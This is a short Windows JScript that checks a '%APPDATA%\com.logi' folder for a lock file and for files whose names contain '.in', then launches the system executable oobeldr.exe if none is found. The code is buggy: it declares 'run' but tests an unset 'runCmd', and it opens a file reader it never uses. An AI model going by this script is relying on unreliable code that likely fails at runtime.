var WShell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var logiPath = WShell.ExpandEnvironmentStrings("%APPDATA%\\com.logi")
if (fso.FolderExists(logiPath)) {
    var lockFile = logiPath + "\\lock"
    if (!fso.FileExists(lockFile)) {
        var folder = fso.GetFolder(logiPath)
        var files = folder.Files
        var run = false
        for(var objEnum = new Enumerator(files); !objEnum.atEnd(); objEnum.moveNext()) {
            item = objEnum.item();
            var fullName = logiPath + "\\" + item.Name
            if (item.Name.search(".in") != -1) {
                runCmd = true
                var reader = fso.OpenTextFile(fullName, 1)
            }
        }
    
        if (!runCmd) {
            WShell.Run("C:\\WINDOWS\\System32\\oobe\\oobeldr.exe")
        }
    }
}